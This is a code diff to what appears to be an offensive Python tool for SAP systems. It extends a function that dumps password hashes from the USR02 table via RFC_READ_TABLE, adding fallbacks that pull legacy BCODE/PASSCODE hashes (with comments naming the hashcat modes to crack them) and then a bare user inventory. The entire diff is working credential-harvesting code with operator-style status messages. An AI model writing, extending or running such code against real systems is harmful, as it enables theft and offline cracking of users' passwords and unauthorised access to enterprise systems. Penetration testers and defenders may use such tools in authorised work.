@@ -2018,9 +2018,48 @@ def download_password_hashes(node: SAPNode,
         with_hash = sum(1 for r in rows if r.get("PWDSALTEDHASH"))
         print(f"[+] {node.sid}: Downloaded {len(rows)} user(s); "
               f"{with_hash} have PWDSALTEDHASH (mode 10300)")
+        return rows
+
+    # --- Method 4: legacy USR02 (no PWDSALTEDHASH) ---
+    # PWDSALTEDHASH was added in SAP_BASIS 6.40 SP4 (~2005).  Older Oracle
+    # SAP installations only have BCODE (8-byte MD5) and PASSCODE (40-byte
+    # SHA-1), so requesting PWDSALTEDHASH raises FIELD_NOT_VALID.  Drop
+    # the modern field and read the legacy ones directly.  RFC_READ_TABLE
+    # will truncate BCODE/PASSCODE to ~8 hex chars (half hashes), still
+    # crackable via hashcat modes 7701 / 7801.
+    print(f"[*] {node.sid}: Retrying legacy USR02 layout "
+          f"(BCODE/PASSCODE only, no PWDSALTEDHASH)...")
+    legacy_fields = ["MANDT", "BNAME", "BCODE", "PASSCODE",
+                     "CODVN", "USTYP", "UFLAG"]
+    rows = read_table(node, "USR02", fields=legacy_fields, creds=creds,
+                      max_rows=9999)
+    if rows:
+        for r in rows:
+            r["PWDSALTEDHASH"] = ""
+            r["hash_quality"] = "half"
+        bcode_count = sum(1 for r in rows if r.get("BCODE"))
+        pass_count = sum(1 for r in rows if r.get("PASSCODE"))
+        print(f"[+] {node.sid}: Downloaded {len(rows)} user(s) — "
+              f"{bcode_count} BCODE, {pass_count} PASSCODE "
+              f"(half hashes — legacy basis, no PWDSALTEDHASH on this release)")
+        return rows
+
+    # --- Method 5: bare-minimum user list (no hashes) ---
+    # If even the legacy field set fails, the user is likely missing
+    # S_TABU_DIS / S_TABU_NAM authorisation on USR02.  Drop to the bare
+    # minimum — just the MANDT/BNAME/USTYP triple is usually authorised
+    # via S_USER_GRP and gives the operator at least a user inventory.
+    print(f"[*] {node.sid}: Last resort: reading user list only "
+          f"(MANDT/BNAME/USTYP)...")
+    minimal = read_table(node, "USR02",
+                          fields=["MANDT", "BNAME", "USTYP"],
+                          creds=creds, max_rows=9999)
+    if minimal:
+        print(f"[!] {node.sid}: Recovered {len(minimal)} user name(s) "
+              f"but NO HASHES — check S_TABU_NAM auth on USR02")
     else:
         print(f"[-] {node.sid}: No password hashes retrieved")
-    return rows
+    return []
 
 
 def _download_hashes_via_sxpg(node: SAPNode,
